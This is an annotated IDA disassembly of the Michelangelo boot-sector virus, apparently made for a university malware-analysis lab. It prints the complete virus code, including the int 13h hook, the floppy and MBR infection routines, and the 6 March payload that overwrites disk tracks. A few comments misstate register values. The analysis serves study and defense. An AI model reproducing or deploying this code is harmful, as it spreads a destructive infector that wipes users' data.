seg000:7C00 ;
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:7C00 ; |           Copyright (c) 2023 Hex-Rays, <support@hex-rays.com>           |
seg000:7C00 ; |                      License info: 48-BABB-7E64-E2                      |
seg000:7C00 ; |                     Georgia Institute of Technology                     |
seg000:7C00 ; +-------------------------------------------------------------------------+
seg000:7C00 ;
seg000:7C00 ; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
seg000:7C00 ; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
seg000:7C00 ; Input CRC32  : 827C7725
seg000:7C00
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C00 ; File Name   : /nethome/anvay/lab02/michelangelo.1
seg000:7C00 ; Format      : Binary file
seg000:7C00 ; Base Address: 0000h Range: 7C00h - 7E00h Loaded length: 0200h
seg000:7C00
seg000:7C00                 .686p
seg000:7C00                 .mmx
seg000:7C00                 .model small
seg000:7C00
seg000:7C00 ; ===========================================================================
seg000:7C00
seg000:7C00 ; Segment type: Pure code
seg000:7C00 seg000          segment byte public 'CODE' use16
seg000:7C00                 assume cs:seg000
seg000:7C00                 ;org 7C00h
seg000:7C00                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00                 jmp     ModifyingInt13hAndCopyingInfectedMBRToMemory ; redirects the program flow to the label loc_7CAF
seg000:7C00 ; ---------------------------------------------------------------------------
seg000:7C03 byte_7C03       db 0F5h                 ; DATA XREF: seg000:7CF0↓r
seg000:7C04                 db 0
seg000:7C05 word_7C05       dw 0                    ; DATA XREF: seg000:7CD8↓w
seg000:7C07                 db 2, 0Eh, 0
seg000:7C0A word_7C0A       dw 9739h                ; DATA XREF: seg000:7CC1↓w
seg000:7C0C word_7C0C       dw 0F000h               ; DATA XREF: seg000:7CC7↓w
seg000:7C0E ; ---------------------------------------------------------------------------
seg000:7C0E                 push    ds              ; pushes ds value on the stack, so that it can be restored later
seg000:7C0F                 push    ax              ; pushes the value in ax on stack
seg000:7C10                 or      dl, dl          ; bitwise or operation of the value in dl register with itself
seg000:7C12                 jnz     short IfFloppyDiskFound ; jumps if dl is not zero, i.e. if dl is not referrring to the first floppy disk
seg000:7C14                 xor     ax, ax          ; set ax value to zero
seg000:7C16                 mov     ds, ax          ; erase and set ds value to zero as well
seg000:7C18                 test    byte ptr ds:43Fh, 1 ; sets the zero flag when least significant byte of 43fh is not set, i.e any of the drive motor is running
seg000:7C18                                         ; So it is checking if any floppy disk is inserted
seg000:7C1D                 jnz     short IfFloppyDiskFound ; jumps if floppy disk is inserted
seg000:7C1F                 pop     ax              ; restores the ax value to the original value
seg000:7C20                 pop     ds              ; restores the ds value to the original value
seg000:7C21                 pushf                   ; pushes the flag register on the stack
seg000:7C22                 call    dword ptr cs:0Ah ; calls the original int 13 handler, 7C0Ch:7C0Ah, with the original register state
seg000:7C27                 pushf                   ; pushes the flag register on the stack
seg000:7C28                 call    InfectFloppyDisk
seg000:7C2B                 popf                    ; restores the value in flag register
seg000:7C2C                 retf    2               ; Return from the procedure, adding 2 bytes to the stack pointer
seg000:7C2F ; ---------------------------------------------------------------------------
seg000:7C2F
seg000:7C2F IfFloppyDiskFound:                      ; CODE XREF: seg000:7C12↑j
seg000:7C2F                                         ; seg000:7C1D↑j
seg000:7C2F                 pop     ax              ; resets the ax register to the original value with which int 13 was called
seg000:7C30                 pop     ds              ; resets the ds register to the original value with which int 13 was called
seg000:7C31                 jmp     dword ptr cs:0Ah ; calls the original int 13 handler, 7C0Ch:7C0Ah with the original register values, without pushing the value in flag register
seg000:7C36
seg000:7C36 ; =============== S U B R O U T I N E =======================================
seg000:7C36
seg000:7C36
seg000:7C36 InfectFloppyDisk proc near              ; CODE XREF: seg000:7C28↑p
seg000:7C36                 push    ax
seg000:7C37                 push    bx
seg000:7C38                 push    cx
seg000:7C39                 push    dx
seg000:7C3A                 push    ds
seg000:7C3B                 push    es
seg000:7C3C                 push    si
seg000:7C3D                 push    di              ; pushes all the registers on the stack, this is saving the state of all the registers on the stack before making any changes in the values of register in this sub routine
seg000:7C3E                 push    cs
seg000:7C3F                 pop     ds              ; copies the value from cs to ds, so both will point to 7C00h
seg000:7C40                 push    cs
seg000:7C41                 pop     es              ; copies the value from cs to es, so both will point to 7C00h
seg000:7C42                 mov     si, 4           ; sets si register to value 4, it will be used as a counter to retry reading the drive again
seg000:7C45
seg000:7C45 ReadBootSectorToMemory:                 ; CODE XREF: InfectFloppyDisk+29↓j
seg000:7C45                 mov     ax, 201h
seg000:7C48                 mov     bx, 200h
seg000:7C4B                 mov     cx, 1
seg000:7C4E                 xor     dx, dx          ;  sets dx to zero
seg000:7C50                 pushf                   ; pushes the flag register on the stack
seg000:7C51                 call    dword ptr ds:0Ah ; This is calling the actual int 13h handler with updated register values
seg000:7C51                                         ;
seg000:7C51                                         ; ah = 02h READ SECTORS FROM DRIVE
seg000:7C51                                         ; al = 01h read one sector
seg000:7C51                                         ; dh = 0h first head
seg000:7C51                                         ; dl = 0h reading from first floppy disk
seg000:7C51                                         ; ch = 0h first cylinder
seg000:7C51                                         ; cl = 1h sector number one
seg000:7C51                                         ; es:bx = buffer address 7E00h
seg000:7C51                                         ;
seg000:7C51                                         ; This loads the sector one of the first floppy disk, i.e. where the boot record of the floppy exists at 7E00h
seg000:7C55                 jnb     short ReadDiskSuccessful ; if the read was successful, then jump
seg000:7C57                 xor     ax, ax          ; sets ax to zero so that AH = 0, and the next interrupt resets the disk system
seg000:7C59                 pushf                   ; pushed the flag register on the stack
seg000:7C5A                 call    dword ptr ds:0Ah ; Resets the disk system
seg000:7C5E                 dec     si              ; decrements the value in si by 1
seg000:7C5F                 jnz     short ReadBootSectorToMemory ; Jumps back to try the read operation again after reseting the disk system; This will retry the read operation until si is set to zero, i.e. four times
seg000:7C61                 jmp     short ResetRegisterState ; This is the final jump when the read operation was not successful in any of the four jumps
seg000:7C63 ; ---------------------------------------------------------------------------
seg000:7C63
seg000:7C63 ReadDiskSuccessful:                     ; CODE XREF: InfectFloppyDisk+1F↑j
seg000:7C63                 xor     si, si          ; sets st to 0
seg000:7C65                 cld                     ; clears direction flag
seg000:7C66                 lodsw                   ; This will load a word (2 bytes) from ds:si (master boot record at 7C00h) to ax
seg000:7C67                 cmp     ax, [bx]        ; checks if it the malicious floppy disk or not
seg000:7C69                 jnz     short CheckIfMaliciousFloppyInserted
seg000:7C6B                 lodsw                   ; loads another word from ds:(si+2) to ax for comparision
seg000:7C6C                 cmp     ax, [bx+2]      ; Check if the current master boot record at 7C00h is from the inserted floppy disk or not
seg000:7C6F                 jz      short ResetRegisterState ; If the current master boot record is from the inserted floppy disk
seg000:7C71
seg000:7C71 CheckIfMaliciousFloppyInserted:         ; CODE XREF: InfectFloppyDisk+33↑j
seg000:7C71                 mov     ax, 301h        ; ah = 03h, so when int 13h is called, it writes sectors to drive
seg000:7C71                                         ; al = 1h, it writes one sector i.e. 512 bytes
seg000:7C74                 mov     dh, 1           ; dh = 1, it writes the first head
seg000:7C76                 mov     cl, 3           ; writes sector 3
seg000:7C78                 cmp     byte ptr [bx+15h], 0FDh ; checks for media type, if a larger floppy is inserted, it copies the original boot record to sector 14, else copies it to sector 3 of the floppy
seg000:7C7C                 jz      short InfectNewFloppyDisk ; jumps based on the media type (if a larger floppy is detected)
seg000:7C7E                 mov     cl, 0Eh         ; otherwise, it sets the value at ds:8 (7C08) to its default value 14
seg000:7C80
seg000:7C80 InfectNewFloppyDisk:                    ; CODE XREF: InfectFloppyDisk+46↑j
seg000:7C80                 mov     ds:8, cx        ; updates the value at ds:8(7C08h) to 3 or 14 based on the media type
seg000:7C84                 pushf                   ; pushes flag register on the stack
seg000:7C85                 call    dword ptr ds:0Ah ; This is calling the actual int 13h handler with updated register values
seg000:7C85                                         ;
seg000:7C85                                         ; ah = 03h WRITE SECTORS TO DRIVE
seg000:7C85                                         ; al = 01h write one sector
seg000:7C85                                         ; dh = 1h first head
seg000:7C85                                         ; dl = 0h reading from first floppy disk
seg000:7C85                                         ; ch = 0h first cylinder
seg000:7C85                                         ; cl = 3h if malicious floppy disk is inserted, otherwise 14, if some other floppy disk is in use
seg000:7C85                                         ; es:bx = buffer address 7E00h
seg000:7C85                                         ;
seg000:7C85                                         ; This is copying the data from the first sector of the floppy disk to the third sector if the floppy disk based on media type, otherwise, it copies to the 14th sector of the floppy disk
seg000:7C89                 jb      short ResetRegisterState
seg000:7C8B                 mov     si, 3BEh        ; This is the offset of the partition table of the boot record copied from the floppy disk from 7C00h
seg000:7C8E                 mov     di, 1BEh        ; This is the offset of partition table of the boot record current in use from 7C00h
seg000:7C91                 mov     cx, 21h ; '!'   ; This sets cx to 33, so that the next instruction copies 33 words from source to destination
seg000:7C94                 cld
seg000:7C95                 rep movsw               ; This will move cx number of words from the address stored at ds:si to the address stored at es:di
seg000:7C95                                         ; This will copy the partition table and boot record signature from the floppy disk record to 446 bytes below the boot record currently in use
seg000:7C97                 mov     ax, 301h
seg000:7C9A                 xor     bx, bx
seg000:7C9C                 mov     cx, 1
seg000:7C9F                 xor     dx, dx
seg000:7CA1                 pushf                   ; pushes the flag register on the stack
seg000:7CA2                 call    dword ptr ds:0Ah ; This is calling the actual int 13h handler with updated register values
seg000:7CA2                                         ;
seg000:7CA2                                         ; ah = 03h WRITE SECTORS TO DRIVE
seg000:7CA2                                         ; al = 01h write one sector
seg000:7CA2                                         ; dh = 0h zero head
seg000:7CA2                                         ; dl = 0h first floppy disk
seg000:7CA2                                         ; ch = 0h first cylinder
seg000:7CA2                                         ; cl = 1h sector one
seg000:7CA2                                         ; es:bx = buffer address 7C00h
seg000:7CA2                                         ;
seg000:7CA2                                         ; This is copying the malicious boot record to the first sector of the first floppy disk, i.e. infecting any new floppy disk inserted
seg000:7CA6
seg000:7CA6 ResetRegisterState:                     ; CODE XREF: InfectFloppyDisk+2B↑j
seg000:7CA6                                         ; InfectFloppyDisk+39↑j ...
seg000:7CA6                 pop     di              ; resets the value in di register to the value before calling the subroutine
seg000:7CA7                 pop     si              ; resets the value in si register to the value before calling the subroutine
seg000:7CA8                 pop     es              ; resets the value in es register to the value before calling the subroutine
seg000:7CA9                 pop     ds              ; resets the value in ds register to the value before calling the subroutine
seg000:7CAA                 pop     dx              ; resets the value in dx register to the value before calling the subroutine
seg000:7CAB                 pop     cx              ; resets the value in cx register to the value before calling the subroutine
seg000:7CAC                 pop     bx              ; resets the value in bx register to the value before calling the subroutine
seg000:7CAD                 pop     ax              ; resets the value in ax register to the value before calling the subroutine
seg000:7CAE                 retn                    ; return from the subroutine
seg000:7CAE InfectFloppyDisk endp
seg000:7CAE
seg000:7CAF ; ---------------------------------------------------------------------------
seg000:7CAF
seg000:7CAF ModifyingInt13hAndCopyingInfectedMBRToMemory:
seg000:7CAF                                         ; CODE XREF: seg000:7C00↑j
seg000:7CAF                 xor     ax, ax          ; Clears the AX register
seg000:7CB1                 mov     ds, ax          ; Initializes the DS (Data Segment) register with zero
seg000:7CB3                 cli                     ; Disables interrupts
seg000:7CB4                 mov     ss, ax          ; Initializes the SS (Stack Segment) register with zero
seg000:7CB6                 mov     ax, 7C00h       ; Sets AX to the base address of the bootloader
seg000:7CB9                 mov     sp, ax          ; Initializes the stack pointer (SP) with the same value, makes the stack poiner point to the base address of the bootloader
seg000:7CBB                 sti                     ; Enables interrupts
seg000:7CBC                 push    ds              ; Pushes the current value of DS onto the stack.
seg000:7CBD                 push    ax              ; Pushes the current value of ax, i.e. the base address of the bootloader 7C00h on the stack
seg000:7CBE                 mov     ax, ds:4Ch      ; Copies the offset of interrupt 13h handler into ax
seg000:7CC1                 mov     ds:word_7C0A, ax ; Copies the offset of interrupt 13h handler into address 9739h
seg000:7CC4                 mov     ax, ds:4Eh      ; Copies the rest of the address of interrupt 13h into ax (Program and Data area)
seg000:7CC7                 mov     ds:word_7C0C, ax ; Copies the rest of the address of 13h into 0f00h (Program and Data area)
seg000:7CCA                 mov     ax, ds:413h     ; Loads the value at 413h address in ax register, 413h has the memory size in kilobytes
seg000:7CCD                 dec     ax
seg000:7CCE                 dec     ax              ; Decrements the value by 2
seg000:7CCF                 mov     ds:413h, ax
seg000:7CD2                 mov     cl, 6
seg000:7CD4                 shl     ax, cl          ; Multiplies the value by 64
seg000:7CD6                 mov     es, ax          ; set the value of es register with the value at 413h, decremented by 2 and multiplied by 64, This would be the segment address of the last 2 KB of the memeory
seg000:7CD6                                         ;
seg000:7CD6                                         ; This memory location will have the backup of the malware code
seg000:7CD8                 mov     ds:word_7C05, ax ; This is just saving the address of the memory location of malware backup
seg000:7CDB                 mov     ax, 0Eh         ; set ax register as 14
seg000:7CDE                 mov     ds:4Ch, ax      ; 4Ch address value is set to 0Eh
seg000:7CDE                                         ; 4Ch points to interrupt 13h code, hence, we are overwriting the offset part of interrupt 13h code to 0Eh
seg000:7CE1                 mov     word ptr ds:4Eh, es ; This is copying the the last two bytes of interrupt 13h address with the address of the malware backup in memory
seg000:7CE5                 mov     cx, 1BEh        ; sets the cx value as 446, represents the number of bytes that would be copied by the rep movsb instruction
seg000:7CE8                 mov     si, 7C00h       ; si is the source register, this is the register from which rep movsb will copy bytes to the destination register
seg000:7CEB                 xor     di, di          ; Setting the di register value as zero, rep movsb will copy from si to es:di, i.e. to the addresss stored in the es register
seg000:7CED                 cld                     ; clears the direction flag
seg000:7CEE                 rep movsb               ; This will copy 446 bytes, i.e. the code segment of master boot record sector (ds:si 7C00h:00h), which is occupied by the malware code to last two KB of the main memory(es:di (memory_size - 2) * 64:00h)
seg000:7CEE                                         ;
seg000:7CEE                                         ; The address es:di would be finally (memory_size - 2)* 1024, the last two KB of the memory
seg000:7CF0                 jmp     dword ptr cs:byte_7C03 ; jumps to the next address 7CF5h, demarcating that the copy operation was successful
seg000:7CF5 ; ---------------------------------------------------------------------------
seg000:7CF5                 xor     ax, ax
seg000:7CF7                 mov     es, ax          ; resets the es register to 0
seg000:7CF9                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7CF9                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7CFB                 push    cs
seg000:7CFC                 pop     ds              ; Copying the value from cs register to ds register, both point to 7C00h
seg000:7CFD                 mov     ax, 201h
seg000:7D00                 mov     bx, 7C00h
seg000:7D03                 mov     cx, ds:8        ; Copies the value at 7C08h, which is 3 or 14 based on media type, to cx register
seg000:7D07                 cmp     cx, 7           ; compares if the value in cx register is equal to 7
seg000:7D07                                         ; It is checking if it has already infected the hard disk or not
seg000:7D0A                 jnz     short BackupOriginalMBRAndUpdateItWithMaliciousMBRInHardDrive ; If the MBR in hard disk is not replaced with malicious MBR, then jumps
seg000:7D0C                 mov     dx, 80h
seg000:7D0F                 int     13h             ; DISK - READ SECTORS INTO MEMORY
seg000:7D0F                                         ; AL = number of sectors to read, CH = track, CL = sector
seg000:7D0F                                         ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7D0F                                         ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7D0F                                         ;
seg000:7D0F                                         ; ah = 02h READ SECTORS TO MEMORY
seg000:7D0F                                         ; al = 01h write one sector
seg000:7D0F                                         ; dh = 0h zero head
seg000:7D0F                                         ; dl = 80h first hard disk
seg000:7D0F                                         ; ch = 0h first cylinder
seg000:7D0F                                         ; cl = 7h sector seven
seg000:7D0F                                         ; es:bx = buffer address 7C00h
seg000:7D0F                                         ;
seg000:7D0F                                         ; It is copying the original boot record from sector 7 of the hard disk to 7C00h, to hide itself
seg000:7D11                 jmp     short CheckDate
seg000:7D13 ; ---------------------------------------------------------------------------
seg000:7D13
seg000:7D13 BackupOriginalMBRAndUpdateItWithMaliciousMBRInHardDrive:
seg000:7D13                                         ; CODE XREF: seg000:7D0A↑j
seg000:7D13                 mov     cx, ds:8        ; stores 14, or 3 in cx register
seg000:7D17                 mov     dx, 100h
seg000:7D1A                 int     13h             ; DISK - Read operation as ah is 02h
seg000:7D1A                                         ; AL is 1, so it will read one sector i.e. 512 bytes
seg000:7D1A                                         ; DL is 0h, so it will read from the first floppy disk
seg000:7D1A                                         ; DH is 1h, so it will read from head 1
seg000:7D1A                                         ; CL is 14 or 3, so it will read from sector 14 or 3
seg000:7D1A                                         ; CH 0 represents cylinder 0
seg000:7D1A                                         ; This reads the data into es:bx address which points to MBR 7C00h
seg000:7D1A                                         ;
seg000:7D1A                                         ; It would copy the backup of the actual boot record from the infected floppy disk to the Master booot Record
seg000:7D1C                 jb      short CheckDate ; carry flag will be set if there was an error in previous disk read operation, this will jump to the specificed location if the disk read operation was not successful
seg000:7D1E                 push    cs
seg000:7D1F                 pop     es              ; Copies the value from cs to es register, both point to 7C00h
seg000:7D20                 mov     ax, 201h
seg000:7D23                 mov     bx, 200h
seg000:7D26                 mov     cx, 1
seg000:7D29                 mov     dx, 80h
seg000:7D2C                 int     13h             ; DISK - AH = 02 READ SECTORS INTO MEMORY
seg000:7D2C                                         ; AL = number of sectors to read (1 sector), CH = track (zero), CL = sector (1st sector)
seg000:7D2C                                         ; DH = head (0, i.e. first head), DL = drive (80h, 1st hard disk), ES:BX -> buffer to fill, which is 7E00h
seg000:7D2C                                         ; Return: CF set on error, AH = status, AL = number of sectors read (1 sector)
seg000:7D2C                                         ;
seg000:7D2C                                         ; This will read the first sector, first track of the first hard disk into the memory address 7E00h
seg000:7D2E                 jb      short CheckDate ; jumps if the read operation was not successful
seg000:7D30                 xor     si, si          ; sets si register to zero
seg000:7D32                 cld                     ; clears the direction flag
seg000:7D33                 lodsw                   ; loads the word addressed by DS:[SI] into register AX. SI is then incremented by 2 bytes, as it loads 2 bytes and directionf lag is set to zero
seg000:7D33                                         ; DS:SI points to the beginning of the MBR 7C00h
seg000:7D34                 cmp     ax, [bx]        ; compares the values at the base address of MBR with the value stored at 200h
seg000:7D36                 jnz     short InfectHardDisk ; jumps if the two values are not equal
seg000:7D38                 lodsw                   ; loads the next word from ds:si (si = 2) into ax
seg000:7D39                 cmp     ax, [bx+2]      ; Compares the next word at ds:si with bx
seg000:7D3C                 jnz     short InfectHardDisk ; If any of the values are not equal, jumps to the InfectsHardDisk function
seg000:7D3E
seg000:7D3E CheckDate:                              ; CODE XREF: seg000:7D11↑j
seg000:7D3E                                         ; seg000:7D1C↑j ...
seg000:7D3E                 xor     cx, cx          ; sets the value in cx register to zero
seg000:7D40                 mov     ah, 4           ; setting ah to 4 so that int 1Ah returns the current day
seg000:7D42                 int     1Ah             ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7D42                                         ; Return: DL = day in BCD
seg000:7D42                                         ; DH = month in BCD
seg000:7D42                                         ; CL = year in BCD
seg000:7D42                                         ; CH = century (19h or 20h)
seg000:7D44                 cmp     dx, 306h        ; checks if the current day is 6 March, Michelangelo's birthday
seg000:7D48                 jz      short StartCorruptingData ; if the date is 6th March, jumps to corrupt drive
seg000:7D4A                 retf
seg000:7D4B ; ---------------------------------------------------------------------------
seg000:7D4B
seg000:7D4B StartCorruptingData:                    ; CODE XREF: seg000:7D48↑j
seg000:7D4B                 xor     dx, dx          ; sets dx to zero
seg000:7D4D                 mov     cx, 1
seg000:7D50
seg000:7D50 checkIfVirusHasInfectedOriginalMBRAndCorruptDrive:
seg000:7D50                                         ; CODE XREF: seg000:7D7F↓j
seg000:7D50                                         ; seg000:7D85↓j
seg000:7D50                 mov     ax, 309h        ; ah = 3h, which means the later interrupt 13 call would write sectors to drive
seg000:7D53                 mov     si, ds:8
seg000:7D57                 cmp     si, 3           ; checks if ds:8 has 3, it was set to 7, while taking the backup of the original Master Boot Record,
seg000:7D57                                         ; It will be overwritten by 3 or 14 while calling the int 13 handler
seg000:7D5A                 jz      short CorruptDrive
seg000:7D5C                 mov     al, 0Eh
seg000:7D5E                 cmp     si, 0Eh         ; Before, infecting the hard disk, the value in ds:8 was 14
seg000:7D61                 jz      short CorruptDrive ; jumps to corrupt drive
seg000:7D63                 mov     dl, 80h
seg000:7D65                 mov     byte ptr ds:7, 4 ; Updates the value at ds:7 to 4
seg000:7D6A                 mov     al, 11h         ; sets al to 11h
seg000:7D6C
seg000:7D6C CorruptDrive:                           ; CODE XREF: seg000:7D5A↑j
seg000:7D6C                                         ; seg000:7D61↑j
seg000:7D6C                 mov     bx, 5000h
seg000:7D6F                 mov     es, bx
seg000:7D71                 assume es:nothing
seg000:7D71                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D71                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7D71                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7D71                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D71                                         ;
seg000:7D71                                         ; Corrupting the drive the system is booting from
seg000:7D71                                         ;
seg000:7D71                                         ; Case-1:
seg000:7D71                                         ; AL = 9h (9 sectors)
seg000:7D71                                         ; CH = 0h (track 0)
seg000:7D71                                         ; CL = 1h (sector 1)
seg000:7D71                                         ; DH = 0h (head 0)
seg000:7D71                                         ; DL = 0h (1st flopppy disk)
seg000:7D71                                         ; ES:BX = 5000h (program and data area)
seg000:7D71                                         ;
seg000:7D71                                         ; Case-2:
seg000:7D71                                         ;
seg000:7D71                                         ; AL = 0Eh (14 sectors, i.e 7168 bytes)
seg000:7D71                                         ; CH = 0h (track 0)
seg000:7D71                                         ; CL = 1h (sector 1)
seg000:7D71                                         ; DH = 0h (head 0)
seg000:7D71                                         ; DL = 0h (1st floppy disk)
seg000:7D71                                         ; ES:BX = 5000h (program and data area)
seg000:7D71                                         ;
seg000:7D71                                         ; Case-3:
seg000:7D71                                         ;
seg000:7D71                                         ; AL = 11h (17 sectors, i.e 7168 bytes)
seg000:7D71                                         ; CH = 0h (track 0)
seg000:7D71                                         ; CL = 1h (sector 1)
seg000:7D71                                         ; DH = 0h (head 0)
seg000:7D71                                         ; DL = 80h (1st hard disk)
seg000:7D71                                         ; ES:BX = 5000h (program and data area)
seg000:7D73                 jnb     short LoopBackToCorruptingDrive ; jump if the write operation was successful
seg000:7D75                 xor     ah, ah          ; Sets the value of ah to 1, so that the call to int 13 resets the disk system
seg000:7D77                 int     13h             ; DISK - RESET DISK SYSTEM
seg000:7D77                                         ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
seg000:7D79
seg000:7D79 LoopBackToCorruptingDrive:              ; CODE XREF: seg000:7D73↑j
seg000:7D79                 inc     dh              ; Increments the dh, so that the virus continues to write to the second, third.. head of the hard disk
seg000:7D7B                 cmp     dh, ds:7        ; ds:7 will have either the value 2, or 4. It depends on whether the virus inefcted the hard disk in the current boot
seg000:7D7F                 jb      short checkIfVirusHasInfectedOriginalMBRAndCorruptDrive ; jump to corrupt the second, third ... head of the hard disk
seg000:7D81                 xor     dh, dh          ; the virus will corrupt the first head of the drive again
seg000:7D83                 inc     ch              ; The virus corrupts the 1st track, 2nd track... of the all the heads of the hard disk
seg000:7D85                 jmp     short checkIfVirusHasInfectedOriginalMBRAndCorruptDrive
seg000:7D87 ; ---------------------------------------------------------------------------
seg000:7D87
seg000:7D87 InfectHardDisk:                         ; CODE XREF: seg000:7D36↑j
seg000:7D87                                         ; seg000:7D3C↑j
seg000:7D87                 mov     cx, 7           ; stores 7 in the cx register
seg000:7D8A                 mov     ds:8, cx        ; ds points to the base address of MBR so ds:8 is 7C08h
seg000:7D8A                                         ; the address 7C08h has the value 7
seg000:7D8A                                         ; This is to track if the virus has already infected hard drive, i,e, if the value at ds:8 is 7, then the malware has already infected master boot record
seg000:7D8E                 mov     ax, 301h        ; sets the value in ax to 301h
seg000:7D91                 mov     dx, 80h         ; sets the value in dx to 80h
seg000:7D94                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7D94                                         ; AL = number of sectors to write,
seg000:7D94                                         ; CH = track,
seg000:7D94                                         ; CL = sector
seg000:7D94                                         ; DH = head,
seg000:7D94                                         ; DL = drive,
seg000:7D94                                         ; ES:BX -> buffer
seg000:7D94                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7D94                                         ;
seg000:7D94                                         ; AL = 1 It will write one sector 512 bytes
seg000:7D94                                         ; CH = 0 1st track
seg000:7D94                                         ; CL = 7h 7th sector
seg000:7D94                                         ; DH = 0
seg000:7D94                                         ; DL = 80h (1st hard disk)
seg000:7D94                                         ; ES:BX = 7E00h
seg000:7D94                                         ;
seg000:7D94                                         ; This will make a backup of the original master boot record from the memory 7E00h at the 7th sector of the first hard disk.
seg000:7D96                 jb      short CheckDate ; jump if the write operation was not successful
seg000:7D98                 mov     si, 3BEh        ; This will be the offset of the partition table of the actual boot record in the memory stored at 7E00h, from 7C00h
seg000:7D9B                 mov     di, 1BEh        ; This is the offste for the partiton table from 7C00h
seg000:7D9E                 mov     cx, 21h ; '!'   ; cx has the value 33 in decimal which signifies 66 bytes to be copied in the next instruction.
seg000:7D9E                                         ; 66 bytes are for copying the whole partition table and boot record signature from the actual copy of the master boot record in the memory to the MBR we got from the floppy disk at 7C00h
seg000:7DA1                 rep movsw               ; This will move cx number of words from the address stored at ds:si to the address stored at es:di
seg000:7DA1                                         ; This will copy the partition table and boot record signature from the actual boot record to 446 bytes below the boot record copied from the floppy disk
seg000:7DA3                 mov     ax, 301h        ; ax is set to 301h
seg000:7DA6                 xor     bx, bx          ; bx is set to zero
seg000:7DA8                 inc     cl              ; cl is set to zero, after rep movsb instruction, cx would have the value zero
seg000:7DAA                 int     13h             ; DISK - WRITE SECTORS FROM MEMORY
seg000:7DAA                                         ; AL = number of sectors to write, CH = track, CL = sector
seg000:7DAA                                         ; DH = head, DL = drive, ES:BX -> buffer
seg000:7DAA                                         ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7DAA                                         ;
seg000:7DAA                                         ; AL = 1 It will write one sector 512 bytes
seg000:7DAA                                         ; CH = 0 1st track
seg000:7DAA                                         ; CL = 1 sector 1
seg000:7DAA                                         ; DH = 0
seg000:7DAA                                         ; DL = 80h (1st hard disk)
seg000:7DAA                                         ; ES:BX = 7C00h
seg000:7DAA                                         ;
seg000:7DAA                                         ; This copies the infected boot record (malware code along with the original partition table and boot record signature) to the first sector of the first hard disk. So, it replaces the original boot record with the malware boot record
seg000:7DAC                 jmp     short CheckDate ; jumps to check data is equal to Michelengelo's birthday and corrupt data in hard disk
seg000:7DAC ; ---------------------------------------------------------------------------
seg000:7DAE                 db 50h dup(0), 55h, 0AAh
seg000:7DAE seg000          ends
seg000:7DAE
seg000:7DAE
seg000:7DAE                 end
